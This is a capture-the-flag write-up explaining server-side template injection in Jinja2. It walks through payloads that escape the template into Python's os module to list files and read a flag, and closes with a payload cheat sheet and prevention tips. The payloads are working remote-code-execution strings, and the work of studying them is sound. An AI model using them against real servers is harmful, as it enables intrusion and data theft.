## What is SSTI?
**Sever-Side Template Injection (SSTI)** is a vulnerability where **user input is directly rendered in a server-side template**, allowing attackers to inject and execute code on the server.

If the template engine doesn’t sanitize user input, things like this become dangerous:

```jinja
Hello {{name}}
```

If name is user-controlled, the attacker could inject:
```text
{{ 7*7 }}
```
Which renders:
```text
Hello 49
```

Now imagine instead of math, the attacker injects Python code to run commans or read files.

## What the Site Looked Like
The site was simple with a text box beside the question
    "What do you want to announce?"

Whatever you typed was reflected on the page. Classic reflection = test for SSTI

### Step 1: Testing the Template Engine
I started small by typing:
```text
{{ 7*7 }}
```

The site returned
```text
49
```

This meant that it was vulnerable to SSTI, and likely using the **jinja2** template engine (used by Flask and many Python apps)

### Step 2: Escalating with Object Traversal
To gain deeper access, I use this payload:
```jinja
{{ config.__class__.__init__.__globals__['os'].popen('ls').read() }}
```

#### What does this do?
- **config**: A Flask object in Jinja2's environment.
-  `.__class__.__init__.__global__`: Gives access to Python's global variable from the class constructor
- ['os']: Pulls in the OS module
- `.popen('ls').read()`: Run a shell command and returns the output

In short: this **breaks out of the sandbox** and let you run system commands.

### Step 3: Viewing the Files
The output of the above command showed:
```
app.py
templates/
flag requirements.txt
```
flag requirement.txt is almost always what we need in a CTF

### Step 4: Reading the Flag
To the read the flag, the following was ran
```jinja
{{ config.__class__.__init__.__globals__['os'].popen('cat flag.txt').read() }}
```

The following flag was printed:
```
picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_ae48ad61}
```

## What I learned
- SSTI can be **powerful and dangerous** - from math to full remote code execution.
- Knowing the internals of Jinja2 (or any engine) is helpful in crafting payloads.
- Object traversal like `config.__class__.__init__.__globals__` is a key way to **break out of templates**.

### Other Templates Engines to Watch Out For
| Engine      | Language | Syntax Example | Known for SSTI? |
|-------------|----------|----------------|------------------|
| Jinja2      | Python   | `{{ ... }}`     | Yes            |
| Twig        | PHP      | `{{ ... }}`     | Yes            |
| Smarty      | PHP      | `{$...}`        | Yes            |
| Velocity    | Java     | `$variable`     | Yes            |
| Freemarker  | Java     | `${...}`        | Yes            |
| EJS         | Node.js  | `<%= ... %>`    | Yes            |
| Razor       | .NET     | `@{...}`        | Yes (rare)     |

Always test different expressions like {{7*7}}, ${7*7}, <%= 7*7 %> to see what sticks.

### How to Prevent SSTI
Developers: Here's how to stay safe:
- Don’t use render_template_string() with raw user input.
- Always sanitize or escape user input in templates.
- Use whitelisted template variables.
- Avoid evaluating user-controlled strings in your rendering logic.
- Use template engine settings to restrict dangerous features.

### Payload Cheat Sheet
| Purpose        | Payload                                                                 |
|----------------|-------------------------------------------------------------------------|
| Confirm SSTI   | `{{7*7}}`                                                               |
| Access config  | `{{ config }}`                                                          |
| List files     | `{{ config.__class__.__init__.__globals__['os'].popen('ls').read() }}`  |
| Read flag.txt  | `{{ config.__class__.__init__.__globals__['os'].popen('cat flag.txt').read() }}` |

## Summary
This was a classic **SSTI challenge** — starting with a simple reflected input, moving to evaluating math, then escalating to reading the server’s filesystem. Understanding Python’s object model and Jinja2 internals gave me full control.
